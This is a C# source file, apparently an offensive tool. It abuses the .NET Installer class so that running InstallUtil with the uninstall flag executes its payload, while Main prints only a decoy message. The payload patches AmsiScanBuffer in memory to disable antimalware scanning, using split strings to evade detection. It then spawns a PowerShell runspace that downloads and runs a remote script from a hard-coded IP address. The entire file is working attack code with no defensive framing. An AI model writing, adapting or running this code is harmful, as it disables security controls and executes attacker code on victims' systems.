using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
using System.Runtime.InteropServices;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("[+] Decoy - Bypass iniciado");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {

        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string lib);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetProcAddress(IntPtr module, string proc);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr address, int size, uint newProtect, out uint oldProtect);

        private static void PatchAMSI()
        {
            try
            {
                string a1 = "am"; string a2 = "si"; string a3 = ".dll";
                IntPtr hAmsi = LoadLibrary(a1 + a2 + a3);
                if (hAmsi == IntPtr.Zero) return;

                string f1 = "Amsi"; string f2 = "Scan"; string f3 = "Buffer";
                IntPtr pAmsiScanBuffer = GetProcAddress(hAmsi, f1 + f2 + f3);
                if (pAmsiScanBuffer == IntPtr.Zero) return;

                byte[] patch = { 0x31, 0xC0, 0xC3 };

                uint oldProtect;
                VirtualProtect(pAmsiScanBuffer, patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);
                VirtualProtect(pAmsiScanBuffer, patch.Length, oldProtect, out oldProtect);

                Console.WriteLine("[+] AMSI patched successfully (stealth 2026)");
            }
            catch
            {
                Console.WriteLine("[-] AMSI patch falló (pero seguimos)");
            }
        }

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            PatchAMSI();

            string injection = @"
                $baseUrl = 'http://192.168.45.244:8081'

               
                try {
                    IEX (New-Object Net.WebClient).DownloadString($baseUrl + '/shRun.txt')
                } catch {
                    Write-Host '[-] Error en HostRecon: ' + $_.Exception.Message
                }
            ";

            try
            {
                using (Runspace rs = RunspaceFactory.CreateRunspace())
                {
                    rs.Open();
                    using (PowerShell ps = PowerShell.Create())
                    {
                        ps.Runspace = rs;
                        ps.AddScript(injection);
                        ps.Invoke();

                        if (ps.HadErrors)
                        {
                            foreach (var err in ps.Streams.Error)
                                Console.WriteLine("[-] PS Error: " + err);
                        }
                    }
                    rs.Close();
                }
                Console.WriteLine("[+] Ejecución completada correctamente");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error general: " + ex.Message);
            }
        }
    }
}
